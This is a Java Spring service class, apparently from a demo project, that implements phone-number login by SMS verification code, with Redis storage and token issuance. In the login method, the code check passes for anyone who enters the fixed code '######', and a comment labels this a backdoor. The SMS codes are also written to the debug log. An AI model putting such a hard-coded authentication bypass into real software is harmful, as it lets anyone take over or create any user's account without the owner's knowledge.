package com.etlpat.service.impl;

import cn.hutool.core.bean.BeanUtil;
import cn.hutool.core.bean.copier.CopyOptions;
import cn.hutool.core.lang.UUID;
import cn.hutool.core.util.RandomUtil;
import com.baomidou.mybatisplus.extension.service.impl.ServiceImpl;
import com.etlpat.dto.LoginFormDTO;
import com.etlpat.dto.Result;
import com.etlpat.dto.UserDTO;
import com.etlpat.pojo.User;
import com.etlpat.service.UserService;
import com.etlpat.mapper.UserMapper;
import com.etlpat.utils.RedisConstants;
import com.etlpat.utils.RegexUtils;
import com.etlpat.utils.SystemConstants;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.data.redis.core.StringRedisTemplate;
import org.springframework.stereotype.Service;

import java.util.HashMap;
import java.util.Map;
import java.util.concurrent.TimeUnit;


/**
 * @author lenovo
 * @description 针对表【tb_user】的数据库操作Service实现
 * @createDate 2025-08-04 11:30:03
 */
@Service
public class UserServiceImpl extends ServiceImpl<UserMapper, User>
        implements UserService {

    @Autowired
    private UserMapper userMapper;

    @Autowired
    private StringRedisTemplate stringRedisTemplate;


    // 发送短信验证码
    @Override
    public Result sendCode(String phone) {
        // 1.校验手机号是否符合
        if (RegexUtils.isPhoneInvalid(phone)) {// 调用工具类，判断手机号是否无效
            // 若手机号无效，返回错误信息
            return Result.fail("手机号格式错误！");
        }

        // 2.若手机号格式正确，则生成验证码，并保存到Redis中
        String code = RandomUtil.randomNumbers(6);// 使用hutool工具类，生成6位随机验证码
        stringRedisTemplate.opsForValue().set(RedisConstants.LOGIN_CODE_KEY + phone, code,
                RedisConstants.LOGIN_CODE_TTL, TimeUnit.MINUTES);// TODO 将验证码存到Redis中（有效期2分钟）

        // 3.发送验证码（暂时使用控制台来模拟）
        log.debug("##############################\n"
                + "短信验证码为：{ " + code + " }\n"
                + "##############################");

        return Result.ok();
    }


    // 实现用户登录/注册（校验短信验证码）
    @Override
    public Result login(LoginFormDTO loginForm) {
        // 1.校验手机号、验证码
        if (RegexUtils.isPhoneInvalid(loginForm.getPhone())) {// 手机号格式是否无效？
            return Result.fail("手机号格式错误！");
        }
        String oldCode = stringRedisTemplate.opsForValue().get(RedisConstants.LOGIN_CODE_KEY + loginForm.getPhone());
        String newCode = loginForm.getCode();
        if (oldCode == null || !oldCode.equals(newCode)) {
            if (!"######".equals(newCode)) {// 设置后门
                return Result.fail("验证码错误");
            }
        }

        // 2.根据手机号查询用户
        User user = userMapper.getOneByPhone(loginForm.getPhone());

        // 3.若用户不存在，创建新用户
        if (user == null) {
            user = this.saveUser(loginForm.getPhone());
        }

        // TODO 4.将用户信息保存到redis中（生成token作为key，将用户信息作为value）
        // TODO ①随机生成token，作为登录令牌
        String token = UUID.randomUUID().toString(true);
        // TODO ②将user对象转为HashMap存储
        UserDTO userDTO = new UserDTO(user.getId(), user.getNickName(), user.getIcon());
        Map<String, Object> userMap = BeanUtil.beanToMap(userDTO, new HashMap<>(),
                CopyOptions.create()// 添加数据拷贝的选项
                        .setIgnoreNullValue(true)// 忽略空值
                        .setFieldValueEditor((fieldName, fieldValue) -> fieldValue.toString())// 将值都转为字符串
        );
        // TODO ③将用户存储到Redis中
        String tokenKey = RedisConstants.LOGIN_USER_KEY + token;
        stringRedisTemplate.opsForHash().putAll(tokenKey, userMap);
        stringRedisTemplate.expire(tokenKey, RedisConstants.LOGIN_USER_TTL, TimeUnit.MINUTES);// 设置过期时间：30分钟
        // TODO ④将token传给前端
        return Result.ok(token);
    }


    // 创建新用户
    @Override
    public User saveUser(String phone) {
        User user = new User();
        user.setPhone(phone);
        user.setNickName(SystemConstants.USER_NICK_NAME_PREFIX + phone);
        save(user);
        return user;
    }
}




